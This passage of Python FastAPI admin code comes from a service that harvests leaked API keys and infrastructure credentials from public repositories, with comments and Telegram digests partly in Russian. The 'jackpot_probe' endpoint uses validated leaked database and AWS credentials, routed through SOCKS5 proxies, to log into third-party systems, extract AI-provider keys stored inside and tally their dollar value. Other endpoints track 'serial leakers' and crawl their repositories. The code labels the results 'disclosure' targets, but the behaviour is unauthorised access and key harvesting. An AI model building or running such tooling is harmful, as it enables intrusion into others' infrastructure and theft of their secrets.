        # Prefer per-item file_type (preserves provenance: kaggle/gitee/code/
        # env/etc when relayed from a mirror); fall back to body-level source
        # label for manual ingest.
        item_ft = (entry.get("file_type") or "").strip()[:30]
        ft = item_ft if item_ft else src_lbl
        saved = db.save_key(prov, key, repo, path, url, 0, "", ft, is_valid)
        if saved:
            n_saved += 1
            if is_valid:
                n_valid += 1
                # Trigger Telegram notification for mirror-sourced finds —
                # without this, mirror finds land silently in DB. notify_found
                # only buffers valid keys for the next 15-min flush.
                try:
                    from notifier import notify_found as _notify
                    await _notify(prov, key, repo, path, url, 0, "", src_lbl, is_valid)
                except Exception as e:
                    log.debug("notify on mirror ingest failed: %s", e)
        out.append({"provider": prov, "preview": key[:14] + "...",
                    "is_valid": is_valid, "saved": saved})

    return {
        "checked":      len(items),
        "saved":        n_saved,
        "valid":        n_valid,
        "duplicate":    n_dupe,
        "no_validator": n_no_validator,
        "results":      out,
    }


@app.post("/admin/refilter_infra")
async def admin_refilter_infra(authorization: str | None = Header(default=None)):
    """
    Re-apply the current _FAKE / _is_template_dsn filter to all existing
    infra_findings. Deletes rows that wouldn't be saved under today's rules
    (templates, mocks, env-var interpolations).

    Run after tightening the infra fake filter — backfills the cleanup that
    only takes effect on NEW finds otherwise.
    """
    _check_admin(authorization)
    from infra_patterns import _is_fake, _is_template_dsn

    def _filter():
        import sqlite3
        conn = sqlite3.connect(DB_PATH)
        conn.row_factory = sqlite3.Row
        try:
            rows = conn.execute(
                "SELECT id, cred_full FROM infra_findings"
            ).fetchall()
            to_delete: list[int] = []
            for r in rows:
                cred = r["cred_full"] or ""
                if _is_fake(cred):
                    to_delete.append(r["id"])
                    continue
                # Database DSNs without @ are templates
                if "://" in cred and "@" not in cred and _is_template_dsn(cred):
                    to_delete.append(r["id"])
                    continue
            if to_delete:
                # SQLite IN(...) cap: chunk by 500
                for i in range(0, len(to_delete), 500):
                    chunk = to_delete[i:i+500]
                    placeholders = ",".join("?" * len(chunk))
                    conn.execute(
                        f"DELETE FROM infra_findings WHERE id IN ({placeholders})",
                        chunk,
                    )
                conn.commit()
            return {"total": len(rows), "deleted": len(to_delete)}
        finally:
            conn.close()

    result = await asyncio.to_thread(_filter)
    log.info("admin refilter_infra: %d/%d removed",
             result["deleted"], result["total"])
    return {"ok": True, **result}


_RECLASSIFY_RUNNING: bool = False
_RECLASSIFY_LAST: dict = {}


@app.post("/admin/reclassify_infra")
async def admin_reclassify_infra(authorization: str | None = Header(default=None)):
    """Re-validate every infra_findings row + recompute risk + add companion_score.

    Pipeline per row:
      1. Extract destination, classify mock vs real
         • docker-internal hostnames (db, postgres, mongo, redis, mariadb,
           localhost, 127.*) → MOCK → is_validated=0, risk_level=low
         • Template DSNs without @password → MOCK → same handling
         • Real FQDN/IP → run validate_database / validate_aws / validate_ssh /
           validate_azure / validate_alibaba via INFRA_VALIDATORS
      2. Compute companion_score (0-100) — heuristic for "probability that
         the same repo has UNPARSED API keys / tokens / infra passwords":
           +30  repo not tree-walked yet
           +20  repo has 0 found_keys (suspicious — should have placeholders at least)
           +15  repo younger than 90 days
           +15  per ADDITIONAL cred_type in same repo (DB+SSH+AWS = juicy target)
           +20  cred string mentions split-form vars (DB_PASSWORD/PGPASSWORD without @host) — parser likely missed it
           -30  repo already has 5+ found_keys (well-covered already)
           clamp [0, 100]
      3. New risk_level computation:
           critical  → is_validated=1 AND companion_score >= 50
           high      → is_validated=1 OR companion_score >= 70
           medium    → not mock, not template, has_password, score >= 30
           low       → mock / template / un-passworded
      4. risk_reasons gets a "companion_score=NN" entry + breakdown bullets.
      5. After completion, send fresh Telegram digest with new counts.

    Runs in background (Railway 300s gateway). Poll /admin/reclassify_status.
    """
    _check_admin(authorization)
    global _RECLASSIFY_RUNNING
    if _RECLASSIFY_RUNNING:
        return {"ok": False, "error": "already running", "last": _RECLASSIFY_LAST}

    async def _bg():
        global _RECLASSIFY_RUNNING, _RECLASSIFY_LAST
        _RECLASSIFY_RUNNING = True
        try:
            _RECLASSIFY_LAST = await _do_reclassify_infra()
        except Exception as e:
            log.error("reclassify_infra crashed: %s", e)
            _RECLASSIFY_LAST = {"error": str(e)[:200]}
        finally:
            _RECLASSIFY_RUNNING = False

    asyncio.create_task(_bg(), name="reclassify_infra")
    return {"ok": True, "message": "reclassification started — poll /admin/reclassify_status"}


@app.get("/admin/probe_state")
async def admin_probe_state(authorization: str | None = Header(default=None)):
    """Comprehensive breakdown of jackpot probe state, grouped by cred_type
    AND validation/probe outcome. Cuts through endpoint limit issues.
    Returns counts only — no creds in response."""
    _check_admin(authorization)
    import sqlite3, json as _json
    from collections import Counter
    with sqlite3.connect(DB_PATH) as c:
        c.row_factory = sqlite3.Row
        rows = c.execute(
            "SELECT cred_type, is_validated, jackpot_data, jackpot_score "
            "FROM infra_findings"
        ).fetchall()
    out: dict = {
        "total_rows": len(rows),
        "by_cred_type": {},
        "validated_breakdown": {},
        "probe_errors_top": Counter(),
        "probe_types_top": Counter(),
    }
    for r in rows:
        ct = r["cred_type"]
        bucket = out["by_cred_type"].setdefault(ct, {
            "total": 0, "validated": 0, "probed_ok": 0,
            "errored": 0, "skipped": 0, "no_jackpot_data": 0,
            "with_keys": 0, "with_validated_keys": 0,
        })
        bucket["total"] += 1
        if r["is_validated"] != 1:
            continue
        bucket["validated"] += 1
        jd_raw = r["jackpot_data"]
        if not jd_raw:
            bucket["no_jackpot_data"] += 1
            continue
        try:
            jd = _json.loads(jd_raw)
        except Exception:
            bucket["no_jackpot_data"] += 1
            continue
        if jd.get("error"):
            bucket["errored"] += 1
            out["probe_errors_top"][jd["error"]] += 1
            continue
        if jd.get("skipped"):
            bucket["skipped"] += 1
            continue
        bucket["probed_ok"] += 1
        out["probe_types_top"][jd.get("probe_type","?")] += 1
        if jd.get("ai_keys_total", 0) > 0:
            bucket["with_keys"] += 1
        if jd.get("ai_keys_total_valid", 0) > 0:
            bucket["with_validated_keys"] += 1
    out["probe_errors_top"] = dict(out["probe_errors_top"].most_common(20))
    out["probe_types_top"] = dict(out["probe_types_top"].most_common())
    return out


@app.get("/admin/reclassify_status")
async def admin_reclassify_status(authorization: str | None = Header(default=None)):
    _check_admin(authorization)
    return {"running": _RECLASSIFY_RUNNING, "last": _RECLASSIFY_LAST}


# ── reclassify implementation ──────────────────────────────────────────────────

import re as _re_main
_DOCKER_INTERNAL_HOSTS = {
    "localhost", "127.0.0.1", "0.0.0.0", "::1",
    "db", "database", "postgres", "postgresql", "pg",
    "mongo", "mongodb", "mongo-db",
    "redis", "redis-master", "redis-cache",
    "mysql", "mariadb",
    "host.docker.internal", "docker.for.mac.localhost",
    "dynamodb", "dynamodb-local",
    "elasticsearch", "es",
    "minio", "rabbitmq", "kafka", "zookeeper",
    "ch", "clickhouse",
}
_SPLIT_FORM_HINT = _re_main.compile(
    r'(?:DB_PASSWORD|DATABASE_PASSWORD|PGPASSWORD|MYSQL_PASSWORD|MONGO_PASSWORD'
    r'|REDIS_PASSWORD|DB_HOST|DATABASE_HOST|PGHOST|MYSQL_HOST|MONGO_HOST'
    r'|REDIS_HOST|DB_USER|DATABASE_USER|PGUSER|MYSQL_USER)',
    _re_main.IGNORECASE,
)


def _classify_destination(cred: str, destination: str, cred_type: str = "") -> str:
    """Returns: 'mock' | 'template' | 'real'

    cred_type-aware: non-DSN cred types (aws/azure/alibaba/ssh/infra)
    classify as 'real' even without an extractable host — they need the
    type-specific validator to determine liveness.
    """
    if not cred:
        return "template"
    # Template variables like ${VAR_NAME}
    if "${" in cred or "{{" in cred:
        return "template"
    # DSN without @password (no actual creds) — only applies to URL-style creds
    if "://" in cred and "@" not in cred and cred_type == "database":
        return "template"
    # Extract host
    host = ""
    if destination:
        try:
            from urllib.parse import urlparse
            host = urlparse(destination).hostname or ""
        except Exception:
            pass
    if not host and "://" in cred:
        try:
            from urllib.parse import urlparse
            host = urlparse(cred).hostname or ""
        except Exception:
            pass
    host_l = (host or "").lower()
    if host_l in _DOCKER_INTERNAL_HOSTS:
        return "mock"
    if host_l.startswith("127.") or host_l.startswith("10.") or host_l == "::1":
        return "mock"
    # Real if has TLD or is dotted-quad public-ish
    if "." in host_l or host_l.count(":") >= 2:
        return "real"
    if not host_l:
        # No host extractable. For DSN-style cred types this means template.
        # For non-DSN types (aws/azure/alibaba/ssh/infra), this is normal —
        # the cred itself encodes everything and the type-specific validator
        # establishes liveness directly.
        if cred_type in ("aws", "azure", "alibaba", "ssh", "infra"):
            return "real"
        return "template"
    return "mock"


def _compute_companion_score(repo: str, cred: str, repo_created: str,
                             stats: dict) -> tuple[int, list[str]]:
    """stats: {is_walked: bool, ai_keys: int, infra_types: set[str], current_type: str}"""
    score = 0
    reasons: list[str] = []
    if not stats["is_walked"]:
        score += 30
        reasons.append("tree_walk не выполнен")
    if stats["ai_keys"] == 0:
        score += 20
        reasons.append("0 распознанных AI-ключей в репо")
    elif stats["ai_keys"] >= 5:
        score -= 30
        reasons.append(f"{stats['ai_keys']} AI-ключей уже распознано (хорошо покрыт)")
    # Repo age
    try:
        from datetime import datetime as _dt, timezone as _tz
        d = _dt.fromisoformat(repo_created.replace("Z", "+00:00"))
        days = (_dt.now(_tz.utc) - d).days
        if days < 90:
            score += 15
            reasons.append(f"свежее репо ({days}д)")
    except Exception:
        pass
    # Other infra types in same repo
    other_types = stats["infra_types"] - {stats["current_type"]}
    if other_types:
        score += min(15 * len(other_types), 30)
        reasons.append(f"+{len(other_types)} тип(а) infra в репо: {sorted(other_types)}")
    # Split-form hint in cred or anywhere (we only have cred — heuristic only)
    if _SPLIT_FORM_HINT.search(cred or ""):
        score += 20
        reasons.append("обрывки имён переменных (split-form пароля)")
    return max(0, min(100, score)), reasons


def _new_risk_level(is_validated: int, companion_score: int,
                    classification: str, has_password: bool) -> str:
    if classification in ("mock", "template"):
        return "low"
    if is_validated == 1 and companion_score >= 50:
        return "critical"
    if is_validated == 1 or companion_score >= 70:
        return "high"
    if has_password and companion_score >= 30:
        return "medium"
    return "low"


async def _do_reclassify_infra() -> dict:
    """The actual heavy work — pulls all rows, validates, scores, updates."""
    import sqlite3, json
    from validators import INFRA_VALIDATORS
    from notifier import _send

    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row

    # Aggregate per-repo stats once for fast lookup
    repo_stats: dict[str, dict] = {}
    for r in conn.execute(
        "SELECT repo, COUNT(*) as cnt FROM found_keys GROUP BY repo"
    ).fetchall():
        repo_stats.setdefault(r["repo"], {})["ai_keys"] = r["cnt"]
    for r in conn.execute(
        "SELECT repo, GROUP_CONCAT(DISTINCT cred_type) as types FROM infra_findings GROUP BY repo"
    ).fetchall():
        repo_stats.setdefault(r["repo"], {})["infra_types"] = set(
            (r["types"] or "").split(",")
        )
    walked = {r[0] for r in conn.execute(
        "SELECT repo_full_name FROM tree_walked_repos"
    ).fetchall()}

    rows = conn.execute(
        "SELECT id, cred_hash, cred_type, cred_full, repo, repo_created, "
        "destination, risk_level, is_validated FROM infra_findings"
    ).fetchall()
    conn.close()
    log.info("reclassify_infra: %d rows to process", len(rows))

    counters = {"mock": 0, "template": 0, "real": 0,
                "validated_ok": 0, "validated_fail": 0,
                "critical": 0, "high": 0, "medium": 0, "low": 0,
                "total": len(rows)}

    sem = asyncio.Semaphore(40)   # parallel TCP probes

    async def _process_one(row) -> tuple[int, dict]:
        cred = row["cred_full"] or ""
        cred_type = row["cred_type"]
        repo = row["repo"] or ""
        cls = _classify_destination(cred, row["destination"] or "", cred_type)

        # Validation
        is_valid = 0
        if cls == "real":
            validator = INFRA_VALIDATORS.get(cred_type)
            if validator:
                async with sem:
                    try:
                        ok = await validator(cred)
                        is_valid = 1 if ok else 0
                    except Exception:
                        is_valid = 0

        # Companion score
        rs = repo_stats.get(repo, {})
        companion, reasons = _compute_companion_score(
            repo, cred, row["repo_created"] or "",
            {
                "is_walked":    repo in walked,
                "ai_keys":      rs.get("ai_keys", 0),
                "infra_types":  rs.get("infra_types", set()),
                "current_type": cred_type,
            },
        )

        has_password = "@" in cred and "://" in cred
        new_risk = _new_risk_level(is_valid, companion, cls, has_password)

        return row["id"], {
            "cls":             cls,
            "is_validated":    is_valid,
            "companion_score": companion,
            "reasons":         reasons,
            "risk_level":      new_risk,
        }

    # Process in parallel
    results = await asyncio.gather(*(_process_one(r) for r in rows),
                                    return_exceptions=True)

    # Bulk update
    conn = sqlite3.connect(DB_PATH)
    try:
        for res in results:
            if isinstance(res, Exception):
                continue
            row_id, info = res
            counters[info["cls"]] += 1
            counters[info["risk_level"]] += 1
            if info["is_validated"] == 1:
                counters["validated_ok"] += 1
            elif info["cls"] == "real":
                counters["validated_fail"] += 1
            # Append companion_score + breakdown to risk_reasons JSON
            new_reasons = (
                [f"companion_score={info['companion_score']}"]
                + info["reasons"]
            )
            conn.execute(
                "UPDATE infra_findings SET is_validated=?, risk_level=?, "
                "risk_reasons=? WHERE id=?",
                (info["is_validated"], info["risk_level"],
                 json.dumps(new_reasons, ensure_ascii=False),
                 row_id),
            )
        conn.commit()
    finally:
        conn.close()

    # Telegram digest
    try:
        msg_lines = [
            "🔬 <b>Реклассификация инфры завершена</b>",
            f"Всего: {counters['total']}",
            f"  • mock (docker-хосты): {counters['mock']}",
            f"  • template (без кредов): {counters['template']}",
            f"  • реальные таргеты: {counters['real']}",
            f"  • валидация прошла (TCP/auth): {counters['validated_ok']}",
            f"  • валидация не прошла: {counters['validated_fail']}",
            "",
            "🚨 Новое распределение по уровням:",
            f"  • CRITICAL: {counters['critical']}",
            f"  • HIGH: {counters['high']}",
            f"  • MEDIUM: {counters['medium']}",
            f"  • LOW: {counters['low']}",
            "",
            "→ /infra?risk=critical для disclosure-таргетов",
        ]
        await _send("\n".join(msg_lines))
    except Exception as e:
        log.error("reclassify TG digest err: %s", e)

    log.info("reclassify_infra done: %s", counters)
    return counters


_JACKPOT_RUNNING: bool = False
_JACKPOT_LAST: dict = {}


@app.post("/admin/jackpot_probe")
async def admin_jackpot_probe(
    limit: int | None = None,
    authorization: str | None = Header(default=None),
):
    """Active jackpot probe — for each is_validated=1 infra cred, attempt
    to authenticate against the actual service and inventory AI-provider
    keys hidden inside (DB rows, AWS SSM/SecretsManager, etc).

    Implements postgres / mongo / redis / aws probes. Direct connect first;
    on failure, TCP reachability via Evomi SOCKS5 (US, DE) — if proxy works
    we mark connect_route='proxy:XX' and skip the actual data-probe (DB
    protocol via SOCKS5 is fragile).

    Saves to infra_findings.jackpot_data (JSON) + jackpot_score (0-100) +
    connect_route. Top disclosure targets: score >= 60.

    Background task. Poll /admin/jackpot_status. Optional ?limit=N to
    process only the most recent N validated rows (default: all).
    """
    _check_admin(authorization)
    global _JACKPOT_RUNNING
    if _JACKPOT_RUNNING:
        return {"ok": False, "error": "already running", "last": _JACKPOT_LAST}

    async def _bg():
        global _JACKPOT_RUNNING, _JACKPOT_LAST
        _JACKPOT_RUNNING = True
        try:
            from infra_jackpot import run_jackpot_cycle
            from notifier import _send
            counters = await run_jackpot_cycle(limit=limit)
            _JACKPOT_LAST = counters
            # Telegram digest
            try:
                lines = [
                    "💎 <b>Jackpot-probe инфры завершён</b>",
                    f"Всего validated row'ов: {counters['total']}",
                    f"  • успешно probed: {counters['probed']}",
                    f"  • через Evomi proxy (только TCP): {counters['via_proxy']}",
                    f"  • дедуп по host (один host = одна попытка): {counters.get('deduped', 0)}",
                    f"  • ошибки/недоступны: {counters['errors']}",
                    "",
                    f"🚨 С AI-ключами внутри инфры: {counters['with_keys']}",
                    f"✅ С <b>ВАЛИДНЫМИ ЖИВЫМИ</b> ключами: {counters['with_validated_keys']}",
                    f"💰 Всего ключей найдено: {counters['total_keys_found']} "
                    f"(<b>{counters['total_validated_keys']} валидных живых</b>)",
                    f"💾 Сохранено в found_keys (новых): "
                    f"<b>{counters.get('saved_to_found_keys', 0)}</b>",
                    f"💵 Оценка ущерба владельцам: "
                    f"<b>~${counters['total_estimated_exposure_usd']:,}/мес</b>",
                    "",
                    f"🎯 score≥60 (готовы к disclosure): {counters['jackpot_critical']}",
                    f"🌋 score≥80 (JACKPOT-severe):       {counters['jackpot_severe']}",
                ]
                if counters['by_provider_validated']:
                    lines.append("")
                    lines.append("✅ <b>Живые ключи по провайдерам (подтверждено):</b>")
                    for prov, n in sorted(counters['by_provider_validated'].items(),
                                           key=lambda x: -x[1]):
                        lines.append(f"  • {prov}: {n}")
                if counters['by_provider']:
                    lines.append("")
                    lines.append("Raw discovery (включая revoked):")
                    for prov, n in sorted(counters['by_provider'].items(),
                                           key=lambda x: -x[1]):
                        valid_n = counters['by_provider_validated'].get(prov, 0)
                        lines.append(f"  • {prov}: {n} ({valid_n} живых)")
                lines.append("")
                lines.append("→ /infra?risk=critical для disclosure-карточек")
                lines.append("→ /infra/jackpot?min_score=60 для JSON-дампа")
                await _send("\n".join(lines))
            except Exception as e:
                log.error("jackpot tg digest err: %s", e)
        except Exception as e:
            log.error("jackpot probe crashed: %s", e)
            _JACKPOT_LAST = {"error": str(e)[:200]}
        finally:
            _JACKPOT_RUNNING = False

    asyncio.create_task(_bg(), name="jackpot_probe")
    return {"ok": True, "message": "jackpot probe started — poll /admin/jackpot_status"}


@app.get("/admin/jackpot_status")
async def admin_jackpot_status(authorization: str | None = Header(default=None)):
    _check_admin(authorization)
    return {"running": _JACKPOT_RUNNING, "last": _JACKPOT_LAST}


@app.post("/admin/cleanup_authors")
async def admin_cleanup_authors(authorization: str | None = Header(default=None)):
    """One-time cleanup — delete watched_authors rows with logins that don't
    match GitHub's username shape (alphanumeric + hyphens, ≤60 chars,
    no `://` or `http:` prefixes).

    Surfaced after the 2026-05-04 fix to _parse_repo: prior tracker
    accepted URL-style repo strings (`https://x/y` → login='https:') which
    polluted the watchlist. This scrubs them. The fix in db.py prevents
    new pollution; this endpoint cleans the historic rows.
    """
    _check_admin(authorization)
    from db import _VALID_LOGIN

    def _do() -> dict:
        import sqlite3
        conn = sqlite3.connect(DB_PATH)
        conn.row_factory = sqlite3.Row
        try:
            rows = conn.execute(
                "SELECT login, platform, leak_count, valid_count FROM watched_authors"
            ).fetchall()
            to_delete: list[tuple[str, str]] = []
            for r in rows:
                login = (r["login"] or "").strip()
                if not login or not _VALID_LOGIN.match(login):
                    to_delete.append((r["login"], r["platform"]))
            for login, platform in to_delete:
                conn.execute(
                    "DELETE FROM watched_authors WHERE login=? AND platform=?",
                    (login, platform),
                )
            conn.commit()
            return {
                "total":     len(rows),
                "deleted":   len(to_delete),
                "examples":  [{"login": l, "platform": p} for l, p in to_delete[:10]],
            }
        finally:
            conn.close()

    result = await asyncio.to_thread(_do)
    log.info("admin cleanup_authors: removed %d/%d invalid-login rows",
             result["deleted"], result["total"])
    return {"ok": True, **result}


@app.post("/admin/purge_happyhorse_fake")
async def admin_purge_happyhorse_fake(authorization: str | None = Header(default=None)):
    """One-shot cleanup of false-positive happyhorse rows from honeyhiveai/*
    repos. The old extract_happyhorse regex had HH_API_KEY trigger that
    collided with HoneyHive AI issue bodies. Since the new (tightened) regex
    requires env-style =/: separator, we simply re-run the new extractor
    against each existing happyhorse row's stored key shape — keys that don't
    look like proper env-var values get deleted.

    Conservative approach: just delete all is_valid=0 happyhorse rows
    (none are valid anyway, and the new regex will re-find any genuine ones
    on next scan if their source repos still exist)."""
    _check_admin(authorization)

    def _do() -> dict:
        import sqlite3
        conn = sqlite3.connect(DB_PATH)
        try:
            cur = conn.execute(
                "SELECT id, repo, file_path, key_full FROM found_keys "
                "WHERE provider='happyhorse' AND is_valid=0"
            )
            rows = cur.fetchall()
            ids = [r[0] for r in rows]
            samples = [{"repo": r[1], "path": r[2], "key": r[3][:40]} for r in rows[:10]]
            if ids:
                conn.execute(
                    f"DELETE FROM found_keys WHERE id IN ({','.join('?'*len(ids))})",
                    ids,
                )
                conn.commit()
                conn.execute("PRAGMA wal_checkpoint(TRUNCATE)")
            return {"deleted": len(ids), "samples": samples}
        finally:
            conn.close()

    result = await asyncio.to_thread(_do)
    log.info("admin purge_happyhorse_fake: %s", result)
    return {"ok": True, **result}


@app.post("/admin/purge_providers")
async def admin_purge_providers(
    body: dict | None = Body(default=None),
    authorization: str | None = Header(default=None),
):
    """Purge given providers from found_keys + axis_extensions + dynamic_queries.
    Default targets (when body omitted): cerebras, groq, mistral, cohere, together.
    Override via body: {"providers": ["suno", "runway", ...]}.
    Idempotent — safe to run multiple times."""
    _check_admin(authorization)
    if body and isinstance(body.get("providers"), list) and body["providers"]:
        targets = tuple(str(p) for p in body["providers"])
    else:
        targets = ("cerebras", "groq", "mistral", "cohere", "together")
    placeholders = ",".join("?" for _ in targets)

    def _do() -> dict:
        import sqlite3
        conn = sqlite3.connect(DB_PATH)
        try:
            counts = {}
            for table, col in (
                ("found_keys",       "provider"),
                ("axis_extensions",  "provider"),
                ("dynamic_queries",  "provider"),
            ):
                pre = conn.execute(
                    f"SELECT COUNT(*) FROM {table} WHERE {col} IN ({placeholders})",
                    targets,
                ).fetchone()[0]
                conn.execute(
                    f"DELETE FROM {table} WHERE {col} IN ({placeholders})",
                    targets,
                )
                counts[table] = pre
            conn.commit()
            conn.execute("PRAGMA wal_checkpoint(TRUNCATE)")
            return counts
        finally:
            conn.close()

    result = await asyncio.to_thread(_do)
    log.info("admin purge_providers: %s", result)
    return {"ok": True, "providers": list(targets), "deleted": result}


@app.get("/admin/dynamic_queries_stats")
async def admin_dynamic_queries_stats(authorization: str | None = Header(default=None)):
    """Inspect dynamic_queries pool: count by theme, recent inserts, sample
    high-yielding queries. Used for verifying archetype miner output."""
    _check_admin(authorization)
    import sqlite3
    from collections import Counter
    out: dict = {}
    with sqlite3.connect(DB_PATH) as c:
        c.row_factory = sqlite3.Row
        out["total"] = c.execute("SELECT COUNT(*) FROM dynamic_queries").fetchone()[0]
        out["by_theme_top20"] = [
            {"theme": r["theme"], "count": r["c"], "yielding": r["y"]}
            for r in c.execute(
                "SELECT theme, COUNT(*) as c, SUM(CASE WHEN keys_found>0 THEN 1 ELSE 0 END) as y "
                "FROM dynamic_queries GROUP BY theme ORDER BY c DESC LIMIT 20"
            ).fetchall()
        ]
        # Recent archetype:* inserts
        out["recent_archetypes"] = [
            {"theme": r["theme"], "query_str": r["query_str"][:120],
             "generated_at": r["generated_at"]}
            for r in c.execute(
                "SELECT theme, query_str, generated_at FROM dynamic_queries "
                "WHERE theme LIKE 'archetype:%' "
                "ORDER BY generated_at DESC LIMIT 30"
            ).fetchall()
        ]
        out["archetype_count"] = c.execute(
            "SELECT COUNT(*) FROM dynamic_queries WHERE theme LIKE 'archetype:%'"
        ).fetchone()[0]
    return out


@app.post("/admin/run_combo_gen")
async def admin_run_combo_gen(authorization: str | None = Header(default=None)):
    """Manually trigger one combinatorial generator batch (synchronous,
    deterministic, no DeepSeek). Adds ~80 fresh queries to dynamic_queries
    pool. Fast — completes in <1s."""
    _check_admin(authorization)
    n_inserted = await asyncio.to_thread(generate_combo_batch)
    n_blacklisted = await asyncio.to_thread(auto_blacklist_dead)
    return {"ok": True, "queries_inserted": n_inserted,
             "auto_blacklisted": n_blacklisted}


@app.post("/admin/run_themer")
async def admin_run_themer(authorization: str | None = Header(default=None)):
    """Manually trigger one themer batch (DeepSeek effort=max, 4-7 min).
    Generates ~25 creative themed queries. Fire-and-forget background."""
    _check_admin(authorization)

    async def _bg():
        try:
            from notifier import _send
            n = await generate_themed_batch()
            log.info("manual themer: +%d themed queries", n)
            try:
                await _send(f"🎨 <b>Manual themer done</b>\nInserted: <b>{n}</b> themed queries")
            except Exception:
                pass
        except Exception as e:
            log.error("manual themer crashed: %s", e)

    asyncio.create_task(_bg(), name="manual_themer")
    return {"ok": True, "message": "themer started in background (4-7 min)"}


@app.post("/admin/run_vocab_expander")
async def admin_run_vocab_expander(authorization: str | None = Header(default=None)):
    """Manually trigger vocab expander cycle (DeepSeek per provider with
    valid keys, 5-15 min total). Discovers new env-names / model-names /
    context-words from real valid-key files."""
    _check_admin(authorization)

    async def _bg():
        try:
            from notifier import _send
            summary = await run_expansion_cycle()
            log.info("manual vocab_expander: %s", summary)
            try:
                msg = (
                    "🧠 <b>Manual vocab expander done</b>\n"
                    f"Total new vocab items: <b>{summary.get('total_inserted', 0)}</b>\n"
                    f"Providers updated: {len(summary.get('providers', {}))}"
                )
                await _send(msg)
            except Exception:
                pass
        except Exception as e:
            log.error("manual vocab_expander crashed: %s", e)

    asyncio.create_task(_bg(), name="manual_vocab_expander")
    return {"ok": True, "message": "vocab_expander started in background (5-15 min)"}


@app.post("/admin/run_archetype_miner")
async def admin_run_archetype_miner(authorization: str | None = Header(default=None)):
    """Manually trigger one archetype-mining cycle (skips the 24h wait)."""
    _check_admin(authorization)

    async def _bg():
        try:
            from notifier import _send
            result = await run_archetype_cycle()
            log.info("manual archetype miner: %s", result)
            try:
                if "error" in result:
                    await _send(f"🧬 archetype miner: {result.get('error')}")
                else:
                    arch_lines = [
                        f"  • {a['name']} ({a['queries_proposed']} queries)"
                        for a in result.get("archetypes", [])[:6]
                    ]
                    await _send(
                        "🧬 <b>Manual archetype miner done</b>\n"
                        f"Архетипов: {result['archetype_count']}\n"
                        f"Queries proposed: {result['queries_proposed']}\n"
                        f"Inserted: <b>{result['queries_inserted']}</b>\n\n"
                        + "\n".join(arch_lines)
                    )
            except Exception as e:
                log.error("archetype manual TG err: %s", e)
        except Exception as e:
            log.error("manual archetype miner crashed: %s", e)

    asyncio.create_task(_bg(), name="manual_archetype_miner")
    return {"ok": True, "message": "archetype miner started in background"}


@app.post("/admin/cleanup_axes")
async def admin_cleanup_axes(authorization: str | None = Header(default=None)):
    """One-time cleanup — reapply the current vocab_expander filter to
    existing axis_extensions rows. Drops entries that would NOT survive
    the post-2026-05-04 filter:
      - env_names ending in _MODEL / _URL / _ENDPOINT / _BASE / _VERSION /
        _REGION / _PROJECT / _ORG / _NAMESPACE / _DEPLOYMENT / _TIMEOUT etc
        (config vars, not secret-bearing)
      - generic noise filenames (api-key.js, main.py, app.py, etc)
      - generic context_words (key, secret, auth, model, ...)
    Run after deploying the filter tightening to scrub historic pollution.
    """
    _check_admin(authorization)
    from vocab_expander import _filter_new

    def _do() -> dict:
        import sqlite3
        conn = sqlite3.connect(DB_PATH)
        conn.row_factory = sqlite3.Row
        try:
            rows = conn.execute(
                "SELECT id, provider, axis, value FROM axis_extensions"
            ).fetchall()
            to_delete: list[int] = []
            for r in rows:
                # _filter_new returns [] if value would be rejected. We pass
                # a single-element list with empty `current` set so the only
                # rejection is the shape filter.
                kept = _filter_new(r["provider"], r["axis"], [r["value"]], set())
                if not kept:
                    to_delete.append(r["id"])
            for i in range(0, len(to_delete), 500):
                chunk = to_delete[i:i + 500]
                ph = ",".join("?" * len(chunk))
                conn.execute(
                    f"DELETE FROM axis_extensions WHERE id IN ({ph})", chunk
                )
            conn.commit()
            return {"total": len(rows), "deleted": len(to_delete)}
        finally:
            conn.close()

    result = await asyncio.to_thread(_do)
    log.info("admin cleanup_axes: removed %d/%d polluted rows",
             result["deleted"], result["total"])
    return {"ok": True, **result}


@app.post("/admin/reset_file_claims")
async def admin_reset_file_claims(authorization: str | None = Header(default=None)):
    """
    Drop all SHA-based file dedup claims. After this, next scan cycle will
    re-fetch ALL previously-scanned files and re-run them through the (now
    expanded) extractor set. Use after adding new providers or extending
    regex patterns to backfill findings from existing repos.

    Does NOT delete found_keys — db.key_exists() still de-dups by key value.
    """
    _check_admin(authorization)
    n = await asyncio.to_thread(db.clear_scanned_files)
    log.info("admin reset_file_claims: cleared %d rows from scanned_files", n)
    return {"ok": True, "cleared": n}


@app.post("/admin/vacuum")
async def admin_vacuum(authorization: str | None = Header(default=None)):
    """Full SQLite VACUUM — repacks DB file after bulk deletes. Takes a few seconds."""
    _check_admin(authorization)
    before = os.path.getsize(DB_PATH) if os.path.exists(DB_PATH) else 0

    def _do():
        import sqlite3
        conn = sqlite3.connect(DB_PATH)
        conn.execute("PRAGMA wal_checkpoint(TRUNCATE)")
        conn.execute("VACUUM")
        conn.close()

    await asyncio.to_thread(_do)
    after = os.path.getsize(DB_PATH) if os.path.exists(DB_PATH) else 0
    return {
        "ok":       True,
        "before_mb": round(before / 1024 / 1024, 2),
        "after_mb":  round(after  / 1024 / 1024, 2),
        "freed_mb":  round((before - after) / 1024 / 1024, 2),
    }


@app.get("/admin/watched_authors")
async def admin_watched_authors(
    only_watched: bool = True,
    limit: int = 100,
    authorization: str | None = Header(default=None),
):
    """Top serial leakers (auto-promoted at >=3 leaks). Sorted by valid_count
    desc, then leak_count desc. Set only_watched=false to also see authors
    below the watch threshold."""
    _check_admin(authorization)
    rows = db.get_watched_authors(limit=limit, only_watched=only_watched)
    return {
        "count": len(rows),
        "items": rows,
    }


@app.post("/admin/walk_author/{login}")
async def admin_walk_author(
    login: str,
    platform: str = "github",
    max_repos: int = 30,
    authorization: str | None = Header(default=None),
):
    """Manually trigger repo tree-walk for one author's public repos.

    Lists all the user's repos, runs walk_repo_tree on those that haven't
    been walked yet. Capped at `max_repos` per call. Returns counts of
    repos walked vs skipped (already-walked).
    """
    _check_admin(authorization)
    import httpx
    async with httpx.AsyncClient(timeout=30, follow_redirects=True) as c:
        result = await walk_one_author(c, login, platform, max_repos=max_repos)
    return {"ok": "error" not in result, "login": login, **result}


_AUTHOR_CYCLE_RUNNING: bool = False
_AUTHOR_CYCLE_LAST_RESULT: dict = {}


@app.post("/admin/run_author_cycle")
async def admin_run_author_cycle(
    authorization: str | None = Header(default=None),
):
    """Manually trigger one author-walk batch cycle (instead of waiting 24h).

    Fire-and-forget: returns immediately while the cycle runs in
    background. Walking 30 authors × ~30 repos × ~30 file fetches takes
    well over Railway's 300s gateway timeout, so we cannot await here.

    Poll /admin/author_cycle_status to see when it finishes and the
    result counters.
    """
